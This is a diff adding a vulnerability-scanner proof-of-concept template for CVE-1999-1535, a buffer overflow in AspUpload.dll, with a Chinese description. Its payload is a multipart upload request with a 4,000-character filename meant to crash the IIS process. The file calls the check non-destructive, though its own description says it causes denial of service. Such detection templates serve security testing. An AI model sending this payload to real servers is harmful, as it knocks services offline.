@@ -1,0 +1,45 @@
+[info]
+author = "ave"
+description = "Persits Software AspUpload 1.4.0.2 之前版本的 AspUpload.dll 存在缓冲区溢出漏洞。远程攻击者可通过向使用 AspUpload 组件的文件上传页面提交超长文件名参数（约 3800 字符以上）触发 inetinfo 进程崩溃，造成拒绝服务。本 PoC 通过构造包含超长 filename 字段的 multipart 上传请求验证目标是否受影响，属于安全无损检测。"
+id = "POC-AVE-1999-1986"
+name = "CVE-1999-1535 AspUpload.dll 缓冲区溢出 PoC"
+severity = "critical"
+tags = ["ave-1999-1986"]
+vuln_id = [
+    "CVE-1999-1535",
+    "AVE-1999-1986",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/aspupload/upload.asp"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+--AVEBOUNDARY\r
+Content-Disposition: form-data; name="file"; filename="{{repeat "A" 4000}}.txt"\r
+Content-Type: text/plain\r
+\r
+AAAA\r
+--AVEBOUNDARY--\r
+"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=AVEBOUNDARY"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "status"
+status = [
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
